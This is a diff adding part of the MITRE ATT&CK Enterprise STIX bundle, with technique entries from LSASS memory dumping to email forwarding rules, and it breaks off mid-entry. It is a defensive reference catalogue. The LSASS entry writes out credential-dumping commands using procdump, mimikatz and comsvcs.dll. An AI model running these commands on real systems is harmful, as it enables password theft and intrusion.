@@ -1,0 +1,930 @@
+{
+ "type": "bundle",
+ "id": "bundle--6198013c-6f02-42a4-9713-38ea1301a1aa",
+ "objects": [
+  {
+   "type": "x-mitre-collection",
+   "id": "x-mitre-collection--1f5f1533-f617-4ca8-9ab4-6a02367fa019",
+   "x_mitre_attack_spec_version": "3.3.0",
+   "name": "Enterprise ATT&CK",
+   "x_mitre_version": "19.2",
+   "description": "ATT&CK for Enterprise provides a knowledge base of real-world adversary behavior targeting traditional enterprise networks. ATT&CK for Enterprise covers the following platforms: Windows, macOS, Linux, PRE, Office 365, Google Workspace, IaaS, Network, and Containers.",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "created": "2018-01-17T12:56:55.080Z",
+   "modified": "2026-08-05T21:33:58.496Z",
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "spec_version": "2.1"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90",
+   "created": "2020-02-11T18:41:44.783Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1003/001",
+     "external_id": "T1003.001"
+    },
+    {
+     "source_name": "Medium Detecting Attempts to Steal Passwords from Memory",
+     "description": "French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.",
+     "url": "https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea"
+    },
+    {
+     "source_name": "Deep Instinct LSASS",
+     "description": "Gilboa, A. (2021, February 16). LSASS Memory Dumps are Stealthier than Ever Before - Part 2. Retrieved December 27, 2023.",
+     "url": "https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2"
+    },
+    {
+     "source_name": "Graeber 2014",
+     "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
+     "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html"
+    },
+    {
+     "source_name": "Volexity Exchange Marauder March 2021",
+     "description": "Gruzweig, J. et al. (2021, March 2). Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities. Retrieved March 3, 2021.",
+     "url": "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
+    },
+    {
+     "source_name": "Powersploit",
+     "description": "PowerSploit. (n.d.). Retrieved December 4, 2014.",
+     "url": "https://github.com/mattifestation/PowerSploit"
+    },
+    {
+     "source_name": "Symantec Attacks Against Government Sector",
+     "description": "Symantec. (2021, June 10). Attacks Against the Government Sector. Retrieved September 28, 2021.",
+     "url": "https://symantec.broadcom.com/hubfs/Attacks-Against-Government-Sector.pdf"
+    },
+    {
+     "source_name": "TechNet Blogs Credential Protection",
+     "description": "Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018.",
+     "url": "https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-05-12T15:12:00.637Z",
+   "name": "LSASS Memory",
+   "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "credential-access"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.3.0",
+   "x_mitre_contributors": [
+    "Edward Millington",
+    "Ed Williams, Trustwave, SpiderLabs",
+    "Olaf Hartong, Falcon Force",
+    "Michael Forret, Quorum Cyber"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": true,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Windows"
+   ],
+   "x_mitre_version": "1.5"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
+   "created": "2020-03-09T13:48:55.078Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1059/001",
+     "external_id": "T1059.001"
+    },
+    {
+     "source_name": "Microsoft PSfromCsharp APR 2014",
+     "description": "Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.",
+     "url": "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/"
+    },
+    {
+     "source_name": "SilentBreak Offensive PS Dec 2015",
+     "description": "Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.",
+     "url": "https://web.archive.org/web/20190508170150/https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/"
+    },
+    {
+     "source_name": "FireEye PowerShell Logging 2016",
+     "description": "Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.",
+     "url": "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html"
+    },
+    {
+     "source_name": "Github PSAttack",
+     "description": "Haight, J. (2016, April 21). PS>Attack. Retrieved September 27, 2024.",
+     "url": "https://github.com/Exploit-install/PSAttack-1"
+    },
+    {
+     "source_name": "inv_ps_attacks",
+     "description": "Hastings, M. (2014, July 16). Investigating PowerShell Attacks. Retrieved December 1, 2021.",
+     "url": "https://powershellmagazine.com/2014/07/16/investigating-powershell-attacks/"
+    },
+    {
+     "source_name": "Malware Archaeology PowerShell Cheat Sheet",
+     "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
+     "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf"
+    },
+    {
+     "source_name": "TechNet PowerShell",
+     "description": "Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.",
+     "url": "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx"
+    },
+    {
+     "source_name": "Sixdub PowerPick Jan 2016",
+     "description": "Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.",
+     "url": "https://web.archive.org/web/20160327101330/http://www.sixdub.net/?p=367"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-05-12T15:12:00.706Z",
+   "name": "PowerShell",
+   "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "execution"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.3.0",
+   "x_mitre_contributors": [
+    "Mayuresh Dani, Qualys",
+    "Praetorian",
+    "Ross Brittain"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": true,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Windows"
+   ],
+   "x_mitre_version": "1.5",
+   "x_mitre_remote_support": false
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
+   "created": "2017-05-31T21:31:00.645Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1078",
+     "external_id": "T1078"
+    },
+    {
+     "source_name": "volexity_0day_sophos_FW",
+     "description": "Adair, S., Lancaster, T., Volexity Threat Research. (2022, June 15). DriftingCloud: Zero-Day Sophos Firewall Exploitation and an Insidious Breach. Retrieved July 1, 2022.",
+     "url": "https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/"
+    },
+    {
+     "source_name": "CISA MFA PrintNightmare",
+     "description": "Cybersecurity and Infrastructure Security Agency. (2022, March 15). Russian State-Sponsored Cyber Actors Gain Network Access by Exploiting Default Multifactor Authentication Protocols and “PrintNightmare” Vulnerability. Retrieved March 16, 2022.",
+     "url": "https://www.cisa.gov/uscert/ncas/alerts/aa22-074a"
+    },
+    {
+     "source_name": "TechNet Credential Theft",
+     "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
+     "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-05-12T15:12:00.707Z",
+   "name": "Valid Accounts",
+   "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "stealth"
+    },
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "persistence"
+    },
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "privilege-escalation"
+    },
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "initial-access"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.3.0",
+   "x_mitre_contributors": [
+    "Jon Sternstein, Stern Security",
+    "Mark Wee",
+    "Menachem Goldstein",
+    "Netskope",
+    "Praetorian",
+    "Prasad Somasamudram, McAfee",
+    "Sekhar Sarukkai, McAfee",
+    "Syed Ummar Farooqh, McAfee",
+    "Yossi Weizman, Azure Defender Research Team"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": false,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Containers",
+    "ESXi",
+    "IaaS",
+    "Identity Provider",
+    "Linux",
+    "macOS",
+    "Network Devices",
+    "Office Suite",
+    "SaaS",
+    "Windows"
+   ],
+   "x_mitre_version": "3.0"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65",
+   "created": "2020-03-13T20:36:57.378Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1078/004",
+     "external_id": "T1078.004"
+    },
+    {
+     "source_name": "AWS Identity Federation",
+     "description": "Amazon. (n.d.). Identity Federation in AWS. Retrieved March 13, 2020.",
+     "url": "https://aws.amazon.com/identity/federation/"
+    },
+    {
+     "source_name": "SpecterOps Managed Identity 2022",
+     "description": "Andy Robbins. (2022, June 6). Managed Identity Attack Paths, Part 1: Automation Accounts. Retrieved March 18, 2025.",
+     "url": "https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a?gi=6a9daedade1c"
+    },
+    {
+     "source_name": "Google Federating GC",
+     "description": "Google. (n.d.). Federating Google Cloud with Active Directory. Retrieved March 13, 2020.",
+     "url": "https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction"
+    },
+    {
+     "source_name": "Microsoft Deploying AD Federation",
+     "description": "Microsoft. (n.d.). Deploying Active Directory Federation Services in Azure. Retrieved March 13, 2020.",
+     "url": "https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-05-12T15:12:00.723Z",
+   "name": "Cloud Accounts",
+   "description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nService or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "stealth"
+    },
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "persistence"
+    },
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "privilege-escalation"
+    },
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "initial-access"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.3.0",
+   "x_mitre_contributors": [
+    "Alon Klayman, Hunters Security",
+    "Arun Seelagan, CISA",
+    "Eliraz Levi, Hunters Security",
+    "Jon Sternstein, Stern Security"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": true,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "IaaS",
+    "Identity Provider",
+    "Office Suite",
+    "SaaS"
+   ],
+   "x_mitre_version": "2.0"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd",
+   "created": "2017-05-31T21:31:22.767Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1110",
+     "external_id": "T1110"
+    },
+    {
+     "source_name": "TrendMicro Pawn Storm Dec 2020",
+     "description": "Hacquebord, F., Remorin, L. (2020, December 17). Pawn Storm’s Lack of Sophistication as a Strategy. Retrieved January 13, 2021.",
+     "url": "https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html"
+    },
+    {
+     "source_name": "ReliaQuest Health Care Social Engineering Campaign 2024",
+     "description": "Hayden Evans. (2024, April 4). Health Care Social Engineering Campaign. Retrieved May 22, 2025.",
+     "url": "https://www.reliaquest.com/blog/health-care-social-engineering-campaign/"
+    },
+    {
+     "source_name": "Dragos Crashoverride 2018",
+     "description": "Joe Slowik. (2018, October 12). Anatomy of an Attack: Detecting and Defeating CRASHOVERRIDE. Retrieved December 18, 2020.",
+     "url": "https://www.dragos.com/wp-content/uploads/CRASHOVERRIDE2018.pdf"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-05-12T15:12:00.706Z",
+   "name": "Brute Force",
+   "description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access. \n\nIf an adversary guesses the correct password but fails to login to a compromised account due to location-based conditional access policies, they may change their infrastructure until they match the victim’s location and therefore bypass those policies.(Citation: ReliaQuest Health Care Social Engineering Campaign 2024)",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "credential-access"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.3.0",
+   "x_mitre_contributors": [
+    "David Fiser, @anu4is, Trend Micro",
+    "Alfredo Oliveira, Trend Micro",
+    "Magno Logan, @magnologan, Trend Micro",
+    "Yossi Weizman, Azure Defender Research Team",
+    "Ed Williams, Trustwave, SpiderLabs",
+    "Mohamed Kmal",
+    "ReliaQuest"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": false,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Containers",
+    "ESXi",
+    "IaaS",
+    "Identity Provider",
+    "Linux",
+    "macOS",
+    "Network Devices",
+    "Office Suite",
+    "SaaS",
+    "Windows"
+   ],
+   "x_mitre_version": "2.8"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c",
+   "created": "2020-02-11T18:39:25.122Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1110/003",
+     "external_id": "T1110.003"
+    },
+    {
+     "source_name": "Trimarc Detecting Password Spraying",
+     "description": "Metcalf, S. (2018, May 6). Trimarc Research: Detecting Password Spraying with Security Event Auditing. Retrieved January 16, 2019.",
+     "url": "https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing"
+    },
+    {
+     "source_name": "Microsoft Storm-0940",
+     "description": "Microsoft Threat Intelligence. (2024, October 31). Chinese threat actor Storm-0940 uses credentials from password spray attacks from a covert network. Retrieved June 4, 2025.",
+     "url": "https://www.microsoft.com/en-us/security/blog/2024/10/31/chinese-threat-actor-storm-0940-uses-credentials-from-password-spray-attacks-from-a-covert-network/"
+    },
+    {
+     "source_name": "BlackHillsInfosec Password Spraying",
+     "description": "Thyer, J. (2015, October 30). Password Spraying & Other Fun with RPCCLIENT. Retrieved April 25, 2017.",
+     "url": "http://www.blackhillsinfosec.com/?p=4645"
+    },
+    {
+     "source_name": "US-CERT TA18-068A 2018",
+     "description": "US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.",
+     "url": "https://www.us-cert.gov/ncas/alerts/TA18-086A"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2025-10-24T17:48:53.996Z",
+   "name": "Password Spraying",
+   "description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\nIn order to avoid detection thresholds, adversaries may deliberately throttle password spraying attempts to avoid triggering security alerting. Additionally, adversaries may leverage LDAP and Kerberos authentication attempts, which are less likely to trigger high-visibility events such as Windows \"logon failure\" event ID 4625 that is commonly triggered by failed SMB connection attempts.(Citation: Microsoft Storm-0940)  ",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "credential-access"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.2.0",
+   "x_mitre_contributors": [
+    "Microsoft Threat Intelligence Center (MSTIC)",
+    "John Strand"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": true,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Containers",
+    "ESXi",
+    "IaaS",
+    "Identity Provider",
+    "Linux",
+    "Network Devices",
+    "Office Suite",
+    "SaaS",
+    "Windows",
+    "macOS"
+   ],
+   "x_mitre_version": "1.8"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0",
+   "created": "2020-02-19T18:54:47.103Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1114/003",
+     "external_id": "T1114.003"
+    },
+    {
+     "source_name": "Mac Forwarding Rules",
+     "description": "Apple. (n.d.). Reply to, forward, or redirect emails in Mail on Mac. Retrieved June 22, 2021.",
+     "url": "https://support.apple.com/guide/mail/reply-to-forward-or-redirect-emails-mlhlp1010/mac"
+    },
+    {
+     "source_name": "Pfammatter - Hidden Inbox Rules",
+     "description": "Damian Pfammatter. (2018, September 17). Hidden Inbox Rules in Microsoft Exchange. Retrieved October 12, 2021.",
+     "url": "https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/"
+    },
+    {
+     "source_name": "Microsoft Tim McMichael Exchange Mail Forwarding 2",
+     "description": "McMichael, T.. (2015, June 8). Exchange and Office 365 Mail Forwarding. Retrieved October 8, 2019.",
+     "url": "https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/"
+    },
+    {
+     "source_name": "Microsoft Mail Flow Rules 2023",
+     "description": "Microsoft. (2023, February 22). Mail flow rules (transport rules) in Exchange Online. Retrieved March 13, 2023.",
+     "url": "https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/mail-flow-rules"
+    },
+    {
+     "source_name": "US-CERT TA18-068A 2018",
+     "description": "US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.",
+     "url": "https://www.us-cert.gov/ncas/alerts/TA18-086A"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2025-10-24T17:49:00.920Z",
+   "name": "Email Forwarding Rule",
+   "description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox 